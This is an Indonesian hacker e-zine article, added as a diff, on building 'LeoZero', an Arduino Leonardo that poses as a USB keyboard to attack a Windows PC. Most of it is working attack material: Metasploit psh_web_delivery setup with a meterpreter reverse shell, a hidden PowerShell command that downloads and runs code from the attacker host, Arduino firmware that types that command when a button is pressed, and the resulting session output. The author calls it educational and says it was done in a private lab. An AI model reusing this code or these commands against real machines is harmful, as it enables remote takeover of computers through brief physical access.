@@ -1,0 +1,241 @@
+           |             _)           
+  _ \  __| __ \   _ \_  / | __ \   _ \
+  __/ (    | | | (   | /  | |   |  __/
+\___|\___|_| |_|\___/___|_|_|  _|\___|
+ECHO MAGAZINE VOLUME XI, ISSUE XXVIII, PHILE 0x005.TXT
+
+
+Leonardo Da Ninja (LeoZero) - One Click Pwned! - Budi Khoirudin
+http://budi.khoirudin.com/ - @x4ce
+
+-----| Disclaimer
+	
+Tulisan ini dibuat untuk tujuan pendidikan apabila pembaca memiliki tujuan
+negatif, berbahaya, atau merugikan harap hentikan membaca dan tutup e-zine
+ini.Segala sesuatu yang saya lakukan disini dilakukan didalam private lab tanpa
+merugikan siapapun.Kepada para pembaca e-zine ini apabila pembaca ingin mencoba
+atau mempraktekan dengan apa yang saya tulis, penulis tidak bertanggung jawab
+atas resiko yang disebabkan. resiko tersebut ditanggung oleh pembaca sendiri.
+
+-----| Latar Belakang
+
+Berawal dari Adrian Crenshaw a.k.a Irongeek mendapatkan hadiah berupa "Phantom
+Keystroker"[1] karena telah menjadi pembicara pada event Shmoocon 2010[2].
+Beliau berpikir bagaimana kalau USB tersebut dimodifikasi untuk melakukan hal
+lain untuk keperluan pentesting, hingga beliau mempresentasikan hal tersebut
+menjadi PHID-USB-Device pada Defcon 18[2] dengan menggunakan USBTeensy.
+Selanjutnya Darren Kitchen dari Hak5 mendapatkan referensi dari Adrian Crenshaw
+tentang USB HID attack hingga diproduksilah "USB Rubber Ducky"[7] yang sampai
+sekarang ini masih ada ditoko online milik Hak5[8].
+
+Mengetahui hal tersebut penulis ingin "ngoprek" device tersebut coba cari
+ditoko didaerah jakarta tidak menemukan yang menjual device USB teensy. Opsi
+lainnya ialah melakukan pemesanan online ke toko Hak5 untuk "USB Rubber Ducky"
+namun karena ribet dan penulis sendiri tidak terbiasa untuk pembelian online
+antar negara, hingga penulis teringat akan microcontroller ardiuno yang
+beberapa waktu lalu sempat "dioprek-oprek". Kembali mengingat sambil melakukan
+research, penulis akhirnya menemukan leonardo.
+
+-----| Konsep
+
+Kenapa penulis memilih menggunakan Leonardo? hal ini dikarenakan flexibelitas,
+extensiable, dan mudah didapat di indonesia (di Toko-toko penjual arduino).
+Selain fitur yang mirip seperti arduino, Leonardo memiliki fungsi lain yaitu
+mensimulasikan keyboard dan mouse [4] seperti yang dilakukan oleh USBTeensy
+maupun USB Rubber Ducky. Nah, fitur tersebut yang akan kita bahas pada ezine
+kali ini.
+
+-----| LeoZero Beraksi
+
+Okay, kita lanjutkan dengan Proof Of Concept untuk Exploitasi:
+
+	Spesifikasi Mesin Attacker:
+	IP: 192.168.56.1
+	OS: Fedora Core 19
+
+	Spesifikasi Mesin Target:
+	IP: 192.168.56.30
+	OS: Windows 7
+
+Exploit yang kita gunakan Windows Powershell Web Delivery lumayan berguna untuk
+bypass Anti Virus juga, ini tergantung dari kreatifitas teman-teman karena kalo
+write payload yang udah-udah terlalu mainstream seperti encode alphanumeric
+atau yang lainnya.  sudah dipraktekan oleh irongeek, hak5, dan SET (Social
+Engineering Toolkit).
+
+	[+] Exploit Windows PowerShell Web Delivery:
+
+	# cowsay++
+	 ____________
+	< metasploit >
+	 ------------
+	       \   ,__,
+	        \  (oo)____
+	           (__)    )\
+	              ||--|| *
+
+
+	       =[ metasploit v4.8.0-dev [core:4.8 api:1.0]
+	+ -- --=[ 1146 exploits - 640 auxiliary - 181 post
+	+ -- --=[ 310 payloads - 30 encoders - 8 nops
+
+	msf > use exploit/windows/misc/psh_web_delivery 
+	msf exploit(psh_web_delivery) > setg SRVHOST 192.168.56.1
+	SRVHOST => 192.168.56.1
+	msf exploit(psh_web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
+	PAYLOAD => windows/meterpreter/reverse_tcp
+	msf exploit(psh_web_delivery) > setg LHOST 192.168.56.1
+	LHOST => 192.168.56.1
+	msf exploit(psh_web_delivery) > set URIPATH /
+	URIPATH => /
+	msf exploit(psh_web_delivery) > exploit -j -z
+	[*] Exploit running as background job.
+
+	[*] Started reverse handler on 192.168.56.1:4444 
+	msf exploit(psh_web_delivery) > [*] Using URL: http://192.168.56.1:8080/
+	[*] Server started.
+	[*] Run the following command on the target machine:
+	powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://192.168.56.1:8080/'))"
+
+	msf exploit(psh_web_delivery) > 
+
+
+Selanjutnya persiapkan Leonardo sesuai dengan schematic[5] setelah Hardware
+siap, kita lanjutkan kesisi Software yaitu buka Arduino IDE lalu setup, Tools >
+Board > Arduino Leonardo , untuk Serial Port > /dev/ttyACM0 pada bagian ini
+tergantung dikomputer masing-masing tinggal menyesuaikan.Arduino IDE sudah di
+setup, kita tinggal tanamkan programing code ke dalam LeoZero itu sendiri,
+berikut Source Codenya.
+
+	[+] Leonardo Code:
+	+------------ Cut From Here -------------
+	|/*
+	|  LeoZero POC exploit
+	|  Created 29 jul 2013
+	|  By Budi Khoirudin
+	|  http://budi.khoirudin.com
+	|  @x4ce
+	|  Modified From http://www.arduino.cc/en/Tutorial/KeyboardButton
+	| */
+        |
+	| const int buttonPin = 4;          // input pin for pushbutton
+	| int previousButtonState = HIGH;   // for checking the state of a pushButton
+        |
+	| void setup() {
+	|    // make the pushButton pin an input:
+	|    pinMode(buttonPin, INPUT);
+	|    // initialize control over the keyboard:
+	|    Keyboard.begin();
+	| }
+        |
+	| void loop() {
+	|    // read the pushbutton:
+	|    int buttonState = digitalRead(buttonPin);
+	|    // if the button state has changed,
+	|    if ((buttonState != previousButtonState)
+	|    // and it's currently pressed:
+	|    && (buttonState == HIGH)) {
+	|        //Call Start Menu
+	|        Keyboard.write(KEY_LEFT_GUI);
+	|        //Write Payload on Run Column
+	|        Keyboard.print("powershell.exe -w hidden -nop -ep bypass -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.56.1:8080/'))\"");
+	|        //Click Enter And PWNED
+	|        Keyboard.write(KEY_RETURN);
+	|          }
+	|  // save the current button state for comparison next time:
+	|   previousButtonState = buttonState;
+	| }
+	+------------ Cut To Here -------------
+	
+Apabila pembaca ingin mengetahui lebih lanjut tentang key modifiers pada
+Leonardo bisa mencari pada referensi ini[6]. okay kembali ke aksi, Klik Verify
+pada Arduino IDE, jika semuanya sukses dilanjutkan dengan meng-upload kedalam
+LeoZero. setelah semua sudah okay, kita lanjut ketahap selanjutnya.
+
+-------| Plug & Pwned:
+
+Hubungkan LeoZero dengan PC Target dengan menggunakan USB Cable, tunggu
+beberapa saat dalam instalasi driver, hal ini berlaku jika target masih fresh
+atau baru belum tersentuh oleh LeoZero.Setelah itu klik tombol tactical button
+di LeoZero, PC target akan mengeksekusi payload yang sudah kita tanamkan
+diLeoZero. kembali ke Mesin Attacker berikut tampilannya.
+
+        +------------------------------
+	| msf exploit(psh_web_delivery) > 
+	| [*] 192.168.56.103   psh_web_delivery - Delivering Payload
+	| [*] Sending stage (751104 bytes) to 192.168.56.103
+	| [*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.103:49164) at 2013-07-31 05:38:34 +0700
+        |
+	| msf exploit(psh_web_delivery) > sessions -i 1
+	| [*] Starting interaction with 1...
+        |
+	| meterpreter > sysinfo
+	| Computer        : LAB-WIN7
+	| OS              : Windows 7 (Build 7600).
+	| Architecture    : x86
+	| System Language : en_US
+	| Meterpreter     : x86/win32
+	| meterpreter > getuid
+	| Server username: LAB-WIN7\X-Ace
+	| meterpreter > ifconfig
+        |
+        | Interface  1
+	| ============
+	| Name         : Software Loopback Interface 1
+	| Hardware MAC : 00:00:00:00:00:00
+	| MTU          : 1500
+	| IPv4 Address : 127.0.0.1
+	| IPv4 Netmask : 255.0.0.0
+        |
+        |
+	| Interface 11
+	| ============
+	| Name         : Intel(R) PRO/1000 MT Desktop Adapter
+	| Hardware MAC : 08:00:27:c4:aa:45
+	| MTU          : 1500
+	| IPv4 Address : 192.168.56.103
+	| IPv4 Netmask : 255.255.255.0
+        |
+        |
+	| Interface 13
+	| ============
+	| Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
+	| Hardware MAC : 08:00:27:6c:2d:7a
+	| MTU          : 1500
+	| IPv4 Address : 10.0.3.15
+	| IPv4 Netmask : 255.255.255.0
+        | 
+	| meterpreter > 
+        +------------------------------
+
+Yuviii ... karena Yiha sudah terlalu mainstream jadi Yuviii (Member gen 2 JKT48
+yang paling lucu) mesin target berhasil diPWNED.  Demikian tulisan ini penulis
+buat, semoga bermanfaat untuk para pembaca ezine yang budiman.
+
+-----| Shoutz
+
+- Allah SWT, Rasulullah, dan Para Nabi
+- My Parents & Family
+- My Oshi yang masih tinggal di Jepang (Atsuko Maeda).
+- My Special One Desy Nurmalasari
+- Member JKT48, AKB48, NMB48, HKT48, dan 48 family
+- Temen-temen Wota : Khairul Ushan, Para Wota/Fans, Wotaking, Wotakage, 
+                     Wota Dimuliakan, dan Para SkyMan
+- Nyubicrew : Nyubi, Matdhule, Bius, Parcom, Awie, BabyCorp, dan semua Crew
+- ECHO : Om Hero, Om Roni, Ammar, Dedi, Om Mulyadi, Azis, Tenroo, Opan,  
+         dan semua Member
+- RNDC, Antihackerlink : (Alm.) Om Arif SakitJiwa, Murray, Arif Dewae, Kendi, 
+                         Faco, Admin AHREPOST, Abenx dan teman-teman semua
+- Thank's buat pak zerfani yulias yang sudah membawakan leonardo ke ranah indonesia :).
+- Kalian, ya.. kalian yang telah membaca E-zine ini
+    	
+-----| Referensi
+
+1. http://www.thinkgeek.com/product/ae83/
+2. http://www.irongeek.com/i.php?page=security/programmable-hid-usb-keystroke-dongle
+3. https://www.defcon.org/images/defcon-18/dc-18-presentations/Crenshaw/DEFCON-18-Crenshaw-PHID-USB-Device.pdf
+4. http://arduino.cc/en/Reference/MouseKeyboard
+5. http://arduino.cc/en/Tutorial/KeyboardMessage
+6. http://arduino.cc/en/Reference/KeyboardModifiers
+7. http://www.usbrubberducky.com/‎
+8. http://hakshop.myshopify.com/products/usb-rubber-ducky
